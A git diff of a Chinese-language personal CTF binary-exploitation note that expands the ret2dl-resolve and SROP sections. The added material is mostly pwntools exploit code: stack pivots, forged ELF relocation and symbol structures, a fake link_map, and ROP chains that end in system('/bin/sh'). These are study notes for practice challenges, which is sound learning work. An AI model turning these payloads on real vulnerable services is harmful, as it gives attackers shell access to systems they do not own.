@@ -607,6 +607,7 @@ ni #汇编语言级
 c #继续 从断点到另一个断点
 
 u 0xabc # 显示汇编码
+u &func
 
 backtrace # bt显示函数调用关系
 k # 查看函数
@@ -3155,7 +3156,7 @@ payload = b'a'*(padding+ebp) + p64(0x4006aa) \
 
 ### ret2dl-resolve
 
-- 不提供 libc
+- 不提供 libc，且未开启PIE
 
 **相关结构**
 
@@ -3231,7 +3232,7 @@ payload = b'a'*(padding+ebp) + p64(0x4006aa) \
 
 ```c
 // 查找目标符号的地址，并将其填入到GOT表中
-_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) {
+_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg) {
     // link_map访问.dynamic 获取符号表地址
     const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
     // link_map访问.dynamic 获取字符串表地址
@@ -3310,14 +3311,127 @@ _dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) {
 
 **32位**
 
-
-
 <img src="/img/pwn_note.zh-cn.assets/image-20241107235715100.png" alt="image-20241107235715100" style="zoom:50%;" />
 
 **利用**：
 
-- 控制第二个参数，使其指向伪造的`Elf32_Rel`，`_dl_runtime_resolve`函数按下标取值操作未进行越界检查
+- plt表调用`_dl_runtime_resolve`动态链接过程步骤5中：`_dl_runtime_resolve(link_map_obj, reloc_offset)` 的arg1 ：`link_map_obj` push 到栈中，此前的参数为arg2：`reloc_offset`，需要栈迁移辅助
+- ROP接下来伪造控制的是arg2，第二个参数，使其指向伪造的`Elf32_Rel`，`_dl_runtime_resolve`函数按下标取值操作未进行越界检查
 - 若`.dynamic`不可写，控制第二参数使其访问到可控内存，内存中伪造`.rel.plt, .dynsym, .dynstr`，调用目标函数
+
+```python
+# 先进行栈迁移, 调用read向fake_ebp读入rop数据
+payload1 = b'a'*padding + fake_ebp_addr + read@plt + p64(leave_ret_addr) + p64(0) + p64(fake_ebp_addr) + p64(100)
+```
+
+利用：
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241110161157056.png" alt="image-20241110161157056" style="zoom: 67%;" />
+
+```python
+func_name = "system"
+func_args = "/bin/sh"
+resolve_plt = elf.get_section_by_name('.plt').header['sh_addr']
+JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
+SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
+STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
+
+fake_rel_addr = rop_addr + 5 * 4
+reloc_offset = fake_rel_addr - JMPREL # 伪造参数指向fake Elf_Rel
+
+fake_sym_addr = rop_addr + 7 * 4
+align = (0x10 - ((fake_sym_addr - SYMTAB) & 0xF)) & 0xF
+fake_sym_addr += align # 通过r_info指向sym地址, 逆向获取r_info和fake_rel值
+r_info = (((fake_sym_addr - SYMTAB) // 0x10) << 8) | 0x7  
+# 0x7 means that Assertion `ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT'
+fake_rel = p32(elf.bss() + 0x10) + p32(r_info)
+
+fake_name_addr = fake_sym_addr + 4 * 4 # 此处为system字符串位置
+st_name = fake_name_addr - STRTAB # 伪造st_name使其指向system
+fake_sym = p32(st_name) + p32(0) * 2 + p8(0x12) + p8(0) + p16(0) # 最终伪造fake Elf_Sym
+
+# +3确保地址向上舍入到下一个 4 字节边界, &~3清除值的最低两位, 保证结果为4的倍数
+bin_sh_offset = (fake_sym_addr + 0x10 - rop_addr + len(func_name) + 3) & ~3
+bin_sh_addr = rop_addr + bin_sh_offset
+
+payload = p32(0) # padding填充, 因为之后esp会指向fake_ebp+4
+payload += p32(resolve_plt) # 实际为_dl_runtime_resolve前一条指令地址
+    # push dword ptr [_GLOBAL_OFFSET_TABLE_+4] <0x804c004> 参数1入栈
+    # jmp  dword ptr [0x804c008] <_dl_runtime_resolve> 跳转到resolve函数
+payload += p32(reloc_offset)
+payload += p32(0) # 目标函数system的返回地址, 用不到, 填充
+payload += p32(bin_sh_addr) # 目标函数的参数1
+payload += fake_rel
+payload += b'\x00' * align
+payload += fake_sym
+payload += func_name
+payload = payload.ljust(bin_sh_offset, b'\x00')
+payload += func_args + b'\x00'
+```
+
+1. 栈迁移read读rop后跳转到`leave ret`地址，ebp此时指向`fake_ebp`，执行后esp指向`fake_ebp+8`，rip指向resolve前一条指令
+2. push resolve函数的第一个参数，且esp中已伪造第二个参数，跳转执行`_dl_runtime_resolve(link_map,reloc_arg)`
+3. 进入后call执行`_dl_fixup`函数，最终调用system函数getshell
+
+**64位**
+
+- 选择`ELFW(ST_VISIBILITY) (sym->st_other)`不为0时的流程，此时计算目标函数地址为`l->l_addr+sym->st_value`
+- 需要知道libc版本，但可在不泄露libc基址情况下利用
+
+- 关键：构造`fake_link_map`
+
+```python
+n64 = lambda x: (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFF 	# 将负数转换为正数
+fake_link_map_addr = 0x404000 + 0x800
+offset = n64(libc.sym['system'] - libc.sym['puts'])
+
+fake_link_map = p64(offset)  									# l_addr
+fake_link_map = fake_link_map.ljust(0x68, b'\x00')
+fake_link_map += p64(elf.bss())  								# l_info[5]需要为可读写的内存, .dynstr
+fake_link_map += p64(fake_link_map_addr + 0x100)  				# l_info[6] Sym
+fake_link_map = fake_link_map.ljust(0xf8, b'\x00')
+fake_link_map += p64(fake_link_map_addr + 0x110)  				# l_info[23] Rel
+fake_link_map += p64(0) + p64(elf.got['puts'] - 8)  			# Elf64_Dyn <-5
+# - 8 使得前面的st_other大概率为非0
+fake_link_map += p64(0) + p64(fake_link_map_addr + 0x120)  		# Elf64_Dyn <-6
+fake_link_map += p64(n64(elf.bss() - offset)) + p32(7) + p32(0) # Elf64_Rel <-23
+```
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241110201338426.png" alt="image-20241110201338426" style="zoom:67%;" />
+
+一：先栈溢出构造read函数向link_map地址读入
+
+```python
+sh_addr = fake_link_map_addr + len(fake_link_map) # /bin/sh字符串地址
+resolve_plt = elf.get_section_by_name('.plt').header.sh_addr
+
+payload1 = b''
+payload1 += padding * b'\x00'
+payload1 += p64(elf.search(asm('ret'), executable=True).__next__()) # ebp
+
+payload1 += p64(elf.search(asm('pop rdi; ret'), executable=True).__next__())
+payload1 += p64(0)
+payload1 += p64(elf.search(asm('pop rsi; ret'), executable=True).__next__())
+payload1 += p64(fake_link_map_addr)
+payload1 += p64(elf.plt['read']) # rdx为数量可以直接用地址值
+
+payload1 += p64(elf.search(asm('pop rdi; ret'), executable=True).__next__())
+payload1 += p64(sh_addr)
+payload1 += p64(resolve_plt + 6) # resolve@plt
+payload1 += p64(fake_link_map_addr)  	# arg1: struct link_map *l
+payload1 += p64(0)  					# arg2: ElfW(Word) reloc_arg
+payload1 = payload1.ljust(0x200, b'\x00')
+```
+
+二：read读入`fake_link_map`
+
+```python
+payload2 = fake_link_map + b'/bin/sh\x00'
+```
+
+### ret2vdso
+
+
 
 ## 花式栈溢出
 
@@ -3381,7 +3495,7 @@ print &__libc_argv[0]
 **"pop ebp ret" + "leave ret"**
 
 > 1. 覆盖**ebp**为非法伪造的地址（堆或bss段），覆盖返回地址为`pop ebp; ret`或 `leave; ret` 的gadget地址
-> 2. 执行到`leave`，即 `mov esp, ebp; pop ebp` ，先**esp**和**ebp**同时指向覆盖后的ebp位置【vuln ebp】
+> 2. 执行到`leave`，即 `mov esp, ebp; pop ebp` ，ebp值给esp，esp+x，先**esp**和**ebp**同时指向覆盖后的ebp位置【vuln ebp】
 > 3. 接着【vuln ebp】地址`pop`给**ebp**，此时**ebp**指向恶意伪造地址
 > 4. `esp＋1`后指向返回地址，执行`mov esp, ebp`，使**esp**和**ebp**同步，栈完成迁移
 > 5. 新栈中由read提前读入构建好ROP链，即可完成利用
@@ -3562,7 +3676,7 @@ payload2 = p64(pop_addr)  # pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
 
 ### SROP
 
-（Sigreturn Oriented Programming），sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验
+（Sigreturn Oriented Programming），主要为64位中利用，sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验
 
 - Linux i386下调用sigreturn的代码存放在vdso中
 - Linux x86_64通过调用15号syscall调用sigreturn
@@ -3689,7 +3803,7 @@ struct sigcontext
 
 覆盖或伪造该结构使得将伪造数据恢复到寄存器中，即控制所有寄存器，rip控制为syscall地址，控制rax利用`syscall; ret; `可任意系统调用，且需要64位中`rax=0xf`触发`SYS_rt_sigreturn`系统调用，32位中为`0x77`
 
-![image-20241024203344880](/img/pwn_note.zh-cn.assets/image-20241024203344880.png)
+<img src="/img/pwn_note.zh-cn.assets/image-20241024203344880.png" alt="image-20241024203344880" style="zoom:67%;" />
 
 使用**pwntools**构造payload
 
@@ -3703,8 +3817,12 @@ signal_frame.rdx = 0
 signal_frame.rip = syscall_addr
 
 # 溢出
-payload = b'a'*padding + p64(mov_rax_f_ret) + p64(syscall) + flat(signal_frame)
+payload = b'a'*padding + p64(mov_rax_0xf_ret) + p64(syscall_addr) + flat(signal_frame)
 ```
+
+由于rsp可控，还可利用进行栈迁移，连续多次SROP
+
+![image-20241110220745416](/img/pwn_note.zh-cn.assets/image-20241110220745416.png)
 
 ## 格式化字符串
 
